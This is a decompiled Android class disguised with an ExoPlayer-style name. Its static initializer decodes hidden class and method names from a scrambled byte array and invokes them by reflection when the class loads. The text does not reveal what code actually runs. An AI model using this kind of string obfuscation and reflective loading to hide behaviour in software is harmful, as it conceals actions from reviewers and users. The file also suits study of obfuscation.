package o;

/* loaded from: classes.dex */
public class ExoPlayerBuilderExternalSyntheticLambda1 {
    private static final byte[] $$a;
    private static int onExtraCallback;
    private static final int $$b = 199;
    private static int IAuthTabCallback = 1;
    static int onWarmupCompleted = 0;
    static int onNavigationEvent = 1;

    private static void a(short s, int i, short s2, Object[] objArr) {
        int i2 = (s * 38) + 73;
        int i3 = i * 31;
        byte[] bArr = $$a;
        int i4 = (s2 * 46) + 4;
        byte[] bArr2 = new byte[47 - i3];
        int i5 = 46 - i3;
        int i6 = -1;
        if (bArr == null) {
            i2 = (i2 + (-i4)) - 6;
            i4++;
            i6 = -1;
        }
        while (true) {
            int i7 = i6 + 1;
            bArr2[i7] = (byte) i2;
            if (i7 == i5) {
                objArr[0] = new String(bArr2, 0);
                return;
            }
            int i8 = i4;
            i2 = (i2 + (-bArr[i4])) - 6;
            i4 = i8 + 1;
            i6 = i7;
        }
    }

    public static native long read();

    static {
        byte[] bArr = {102, -86, -98, 53, 59, -40, -34, 5, -8, -8, -9, -13, -3, 2, -7, -19, 40, -35, -25, 13, 8, -34, -12, -3, 9, -8, 26, -57, -2, 9, -19, -2, 7, -17, 19, -44, 5, -12, 6, -3, -21, 5, 0, 17, -27, -18, 5, -8, -3, 43, 2, -58, -5, 6, 14, -19, -7, 25, -36, -17, -6, 4, -5, -8, -14};
        $$a = bArr;
        onExtraCallback = 0;
        byte b = (byte) (199 & 1);
        try {
            byte b2 = bArr[42];
            Object[] objArr = new Object[1];
            a(b, b2, b2, objArr);
            Class<?> cls = Class.forName((String) objArr[0]);
            byte b3 = bArr[42];
            byte b4 = (byte) (b3 + 1);
            Object[] objArr2 = new Object[1];
            a(b3, b4, b4, objArr2);
            cls.getMethod((String) objArr2[0], null).invoke(null, null);
            int i = IAuthTabCallback;
            int i2 = (i & 35) + (i | 35);
            onExtraCallback = i2 % 128;
            int i3 = i2 % 2;
        } catch (Throwable th) {
            Throwable cause = th.getCause();
            if (cause == null) {
                throw th;
            }
            throw cause;
        }
    }
}
